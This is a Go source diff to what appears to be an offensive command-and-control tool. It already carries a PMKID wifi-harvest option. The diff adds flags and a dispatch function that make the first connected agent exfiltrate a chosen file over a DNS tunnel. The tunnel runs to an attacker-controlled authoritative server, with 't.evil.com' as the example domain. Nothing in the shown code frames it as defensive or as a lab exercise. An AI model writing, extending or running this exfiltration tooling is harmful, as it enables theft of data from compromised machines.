@@ -227,6 +227,10 @@ func main() {
 	workflowDry := flag.Bool("workflow-dry", false, "preview steps without executing")
 	workflowCSInt := flag.String("workflow-csint-root", "", "directory to index (csint step)")
 	workflowTitle := flag.String("workflow-report-title", "", "title for the final report step")
+	dnsTunnel := flag.String("dns-tunnel", "", "exfil a payload via DNS: pass the authoritative server IP")
+	dnsTunnelDomain := flag.String("dns-tunnel-domain", "", "tunnel suffix domain (e.g. t.evil.com)")
+	dnsTunnelFile := flag.String("dns-tunnel-file", "", "file to exfiltrate (or omit to exfil a test string)")
+	dnsTunnelPort := flag.Int("dns-tunnel-port", 53, "server port")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -796,6 +800,27 @@ func main() {
 			DryRun:      *workflowDry,
 			CSIntRoot:   *workflowCSInt,
 			ReportTitle: *workflowTitle,
+		})
+	}
+
+	// dns tunnel dispatch — exfil a payload via DNS on the first agent
+	if *dnsTunnel != "" {
+		var payload []byte
+		if *dnsTunnelFile != "" {
+			b, err := os.ReadFile(*dnsTunnelFile)
+			if err != nil {
+				log.Printf("[dnstunnel] read file: %v", err)
+			} else {
+				payload = b
+			}
+		} else {
+			payload = []byte("redsky dns tunnel test payload")
+		}
+		go runDNSTunnelDispatch(mgr, dnsTunnelArgs{
+			Server:  *dnsTunnel,
+			Domain:  *dnsTunnelDomain,
+			Port:    *dnsTunnelPort,
+			Payload: payload,
 		})
 	}
 
@@ -2030,5 +2055,33 @@ func runWorkflowDispatch(mgr *session.Manager, a workflowArgs) {
 	}
 	if err := s.SendWorkflowStart(sessionID, req); err != nil {
 		log.Printf("[workflow] start: %v", err)
+	}
+}
+
+// dnsTunnelArgs carries the operator's -dns-tunnel* flags.
+type dnsTunnelArgs struct {
+	Server  string
+	Domain  string
+	Port    int
+	Payload []byte
+}
+
+// runDNSTunnelDispatch waits for the first agent, sends a DNSTunnelStart.
+func runDNSTunnelDispatch(mgr *session.Manager, a dnsTunnelArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("dt-%d", time.Now().UnixNano())
+	log.Printf("[dnstunnel] %d bytes -> %s@%s -> %s", len(a.Payload), a.Domain, a.Server, s.AgentID)
+	req := proto.DNSTunnelStart{
+		SessionID: sessionID,
+		Server:    a.Server,
+		Port:      a.Port,
+		Domain:    a.Domain,
+		Payload:   a.Payload,
+	}
+	if err := s.SendDNSTunnelStart(sessionID, req); err != nil {
+		log.Printf("[dnstunnel] start: %v", err)
 	}
 }
